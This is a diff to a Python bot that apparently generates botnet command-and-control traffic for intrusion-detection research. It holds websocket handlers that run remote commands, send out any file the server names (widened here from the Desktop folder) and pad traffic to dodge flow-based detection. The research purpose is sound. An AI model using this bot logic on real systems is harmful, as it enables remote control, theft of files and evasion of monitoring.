@@ -30,8 +30,8 @@ class persistent_connection_via_websocket():
         self.bot_config = bot_config
         self.server = server
         self.server_port = server_port
-    def generate_random_string(self,size):
-        return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
+    def generate_random_string(self,size:int):
+        return ''.join(random.choices(string.ascii_letters + string.digits, k=int(size[0])))
     async def rce(self, websocket, command):
         """Executes a command and returns the output."""
         try:
@@ -70,10 +70,8 @@ class persistent_connection_via_websocket():
                     #command = list(command_data.values())[0]
                     await self.rce(websocket=websocket,command=list(command_data.values())[0])
                 elif "exfil" in  list(command_data.keys())[0]:
-                    #whoami=subprocess.run(['whoami'], capture_output=True, text=True)
-                    home_directory = Path.home()
-                    target_path = home_directory / "Desktop" 
-                    await self.exfil(websocket=websocket, file_path=f"{target_path}/{list(command_data.values())[0]}")
+
+                    await self.exfil(websocket=websocket, file_path=f"{list(command_data.values())[0]}")
                 elif "src2dst_max_ps" in list(command_data.keys())[0] and command_data["src2dst_max_ps"] != None:
                     pad= self.generate_random_string(command_data["src2dst_max_ps"])
                     await websocket.send(pad)
@@ -81,7 +79,7 @@ class persistent_connection_via_websocket():
                     await websocket.recv()
                 elif "src2dst_packets" in list(command_data.keys())[0] and command_data["src2dst_packets"] != None:
                     pad = ""
-                    for i in range(command_data["src2dst_packets"]):
+                    for i in range(int(command_data["src2dst_packets"][0])):
                         await websocket.send(pad) 
                     await websocket.send("END") 
                 elif "dst2src_bytes" in list(command_data.keys())[0] and command_data["dst2src_bytes"] != None:
@@ -115,7 +113,7 @@ def start_tcpdump( interface: str, output_file):
     tcpdump_process = subprocess.Popen(command, preexec_fn=os.setsid)
     return tcpdump_process
 def stop_tcpdump( process):
-        print("---------------------------------------> killed")
+        print("---------------------------------------> tcpdump traffic capturing is stopped <---------------------------------------")
         os.killpg(os.getpgid(process.pid), signal.SIGTERM)
         #await process.wait()
 
@@ -160,11 +158,11 @@ async def main():
     # check if user wanted to realize adevrsarial pertubation values during bot<->C2 communication
     if traffic_generation_config["adversarial"]:
         #set defualt underlaying limit to adversarial features
-        #underlay_limit = { 'src2dst_packets': 0, 'src2dst_bytes': 0, 'src2dst_max_ps': 0, 'dst2src_packets': 0, 'dst2src_bytes': 0, 'dst2src_max_ps': 0 }
+        adversarial_feature_list = [ 'src2dst_packets', 'src2dst_bytes', 'src2dst_max_ps', 'dst2src_packets', 'dst2src_bytes', 'dst2src_max_ps' ]
         underlay_limit = {}
         # update adversarial feature pertubation values accroding to the input config 
         for key, item in traffic_generation_config["adversarial_config"].items():
-            if key in underlay_limit.keys():
+            if key in adversarial_feature_list:
                 underlay_limit[key] = item
             else:
                 print(f"❌ Adversarial feature has not found")
@@ -183,7 +181,7 @@ async def main():
                 bot = persistent_connection_via_websocket(bot_config=bot_config)
                 await bot.websocket_client(server=traffic_generation_config["server_ip"], server_port=traffic_generation_config["server_port"] )
 
-            except websockets.exceptions.Connsub_keyectionClosed as e:
+            except websockets.exceptions.ConnectionClosed as e:
                 print("Connection closed:", e)
                 #stop_tcpdump(tcpdump_process)
 
@@ -209,7 +207,7 @@ async def main():
                 bot = persistent_connection_via_websocket(bot_config=bot_config)
                 await bot.websocket_client(server=traffic_generation_config["server_ip"], server_port=traffic_generation_config["server_port"] )
 
-            except websockets.exceptions.Connsub_keyectionClosed as e:
+            except websockets.exceptions.ConnectionClosed as e:
                 print("Connection closed:", e)
                 #stop_tcpdump(tcpdump_process)
 
